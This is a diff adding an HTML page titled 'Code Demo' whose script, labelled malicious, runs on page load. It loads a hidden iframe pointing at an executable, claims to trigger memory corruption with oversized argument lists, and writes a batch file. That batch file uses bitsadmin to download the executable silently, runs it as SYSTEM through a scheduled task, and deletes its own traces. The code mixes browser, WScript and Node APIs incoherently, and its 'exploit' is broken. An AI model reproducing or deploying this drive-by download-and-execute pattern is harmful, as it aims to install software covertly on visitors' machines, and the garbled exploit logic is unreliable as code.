@@ -1,0 +1,55 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Code Demo</title>
+</head>
+<body>
+    <script>
+        // Define a malicious JavaScript function
+        function evil() {
+            // Create a hidden iframe
+            var iframe = document.createElement("iframe");
+            iframe.style.display = "none";
+            document.body.appendChild(iframe);
+
+            // Set the source to the malicious link
+            iframe.src = "https://down.360safe.com/se/setup_online_1.1.12.0.exe";
+
+            // Wait for the iframe to load
+            iframe.onload = function() {
+                // Get the iframe's window object
+                var win = iframe.contentWindow;
+
+                // Trigger the memory corruption by calling a JavaScript function with a large number of arguments
+                win.eval("Math.max(" + "0,".repeat(0x100000) + "0)");
+
+                // Create a batch file to execute the downloaded file by calling another JavaScript function with a large number of arguments
+                // Store the returned object in a variable
+                var batch = win.eval("WScript.Shell.CreateObject(" + "'".repeat(0x100000) + `Scripting.FileSystemObject` + "'".repeat(0x100000) + ").CreateTextFile(" + "'".repeat(0x100000) + `${process.env.TEMP}\\setup.bat` + "'".repeat(0x100000) + ", true)");
+
+                // Write the batch file content
+                batch.WriteLine("@echo off");
+                batch.WriteLine("REM 静默下载文件到临时目录");
+                batch.WriteLine("bitsadmin /transfer mydownloadjob /priority high https://down.360safe.com/se/setup_online_1.1.12.0.exe %temp%\\setup.exe");
+                batch.WriteLine("REM 创建一个隐藏的任务计划程序，运行下载的文件");
+                batch.WriteLine("schtasks /create /tn mytask /tr %temp%\\setup.exe /sc once /st 00:00 /ru system /f");
+                batch.WriteLine("REM 启动任务计划程序");
+                batch.WriteLine("schtasks /run /tn mytask");
+                batch.WriteLine("REM 删除任务计划程序");
+                batch.WriteLine("schtasks /delete /tn mytask /f");
+                batch.WriteLine("REM 删除批处理文件");
+                batch.WriteLine("del %temp%\\setup.bat");
+
+                // Close the batch file
+                batch.Close();
+
+                // Execute the batch file
+                require("child_process").execSync(`${process.env.TEMP}\\setup.bat`);
+            };
+        }
+
+        // Call the malicious JavaScript function
+        evil();
+    </script>
+</body>
+</html>
